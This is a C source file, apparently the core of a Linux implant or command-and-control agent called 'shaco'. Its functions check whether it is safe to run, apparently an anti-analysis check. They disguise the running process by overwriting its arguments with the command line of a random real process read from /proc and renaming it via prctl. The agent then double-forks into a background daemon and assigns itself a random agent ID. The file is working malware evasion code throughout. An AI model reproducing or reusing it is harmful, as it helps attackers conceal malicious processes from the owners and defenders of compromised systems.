#include "Core.h"
#include "Commands.h"

#include "../Common/shaco_stdlib.h"
#include "../Common/Network.h"
#include "../Config/Settings.h"
#include "../Helpers/Protect.h"
#include "../Protocol/Packer.h"

#include <sys/prctl.h>
#include <dirent.h>
#include <fcntl.h>

#define MAX_PROCESSES 1024
#define MAX_CMDLINE_LENGTH 2048

typedef struct process_t{
    char cmdline[MAX_CMDLINE_LENGTH];
    struct process_t *next;
}PROCESS, *PPROCESS;

void process_free(PPROCESS proc);
void hide_process(char *argv[]);
void daemonize();


bool shaco_init(char *argv[]){
    MSG("Checking if is safe to run");
    if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}

    hide_process(argv);
    packer_set_alloc_func(shaco_malloc, shaco_realloc, shaco_free);
    daemonize();

    PSETTINGS ps = get_settings();
#ifndef DEBUG
    ps->agent_id = generate_random_int(1111, 999999);
#else
    ps->agent_id = 0;
#endif

    return true;
}

void shaco_exit(){ s__exit(1); }

void shaco_sleep(int value){
    if(value <= 0) return;
    struct timespec req, rem;
    req.tv_sec = value;
    req.tv_nsec = 0;
    while(s_nanosleep(&req, &rem))
        req = rem;
    return;
}


void process_free(PPROCESS proc){
    if(!proc) return;

    PPROCESS current = proc;
    while(current != NULL){
        PPROCESS next = current->next;
        shaco_free(current);
        current = next;
    }
    proc = NULL;
}

PPROCESS get_procs_to_spoof(int *size){
#ifdef HIDE_CMDLINE
    PPROCESS head = NULL, current = NULL;
    int size_array = 0;

    DIR *dir = opendir("/proc");
    if(!dir) return NULL;
    struct dirent *entry;
    while((entry = readdir(dir)) != NULL){

        if(entry->d_type != DT_DIR || s_atoi(entry->d_name, NULL) < 0)
            continue;

        char cmdline_path[MAX_CMDLINE_LENGTH] = {};
        s_snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);

        int cmdfd = s_open(cmdline_path, O_RDONLY,0);
        if(cmdfd < 0)
            goto NEXT;

        char cmdline[MAX_CMDLINE_LENGTH];
        ssize_t read_sz = s_read(cmdfd, cmdline, sizeof(cmdline));

        if(read_sz <= 0)
            goto NEXT;
        
        
        if(cmdline[0] != '/')
            goto NEXT;

        cmdline[read_sz - 1] = '\0';

        PPROCESS process = shaco_malloc(sizeof(PROCESS));
        if(process == NULL){
            s_close(cmdfd);
            closedir(dir);
            return NULL;
        }

        StringCopy(process->cmdline, cmdline);
        process->next = NULL;

        if(!head){
            head = process;
            current = process;
        }else{
            current->next = process;
            current = process;
        }
        ++size_array;
NEXT:
        if(cmdfd >= 0)
            s_close(cmdfd);
        continue;
    }
    if(size != NULL) *size = size_array;
    closedir(dir);
    return head;
#endif
    return NULL;
}

void hide_process(char *argv[]){
#ifdef HIDE_CMDLINE
    if(!argv) return;

    int size = 0;
    PPROCESS procs = get_procs_to_spoof(&size);

    for(int i = 0; argv[i] != NULL; ++i){
        for(int y = 0; y < StringLength(argv[i]); ++y)
            argv[i][y] = ' ';
    }
    if(procs != NULL || size > 0){
        int random_cmdline = generate_random_int(0, size);
        int i = 0;
        PPROCESS current = procs;
        char *cmdline = NULL;
        while(current != NULL){
            if(random_cmdline == i)
                cmdline = current->cmdline;
            current = current->next;
            ++i;
        }


        if(cmdline != NULL){
            StringCopy(argv[0], cmdline);
            s_prctl(15, cmdline);
        }

        process_free(procs);
    }
#endif
}

void daemonize(){
#ifdef DAEMONIZE
    pid_t _t = s_fork();
    if(_t < 0 || _t > 0) shaco_exit();
    s_setsid();
    s_signal(SIGCHLD, SIG_IGN);
    s_signal(SIGHUP, SIG_IGN);
    _t = s_fork();
    if (_t < 0 || _t > 0) shaco_exit();
    s_umask(0);
    s_chdir("/");
#endif
}
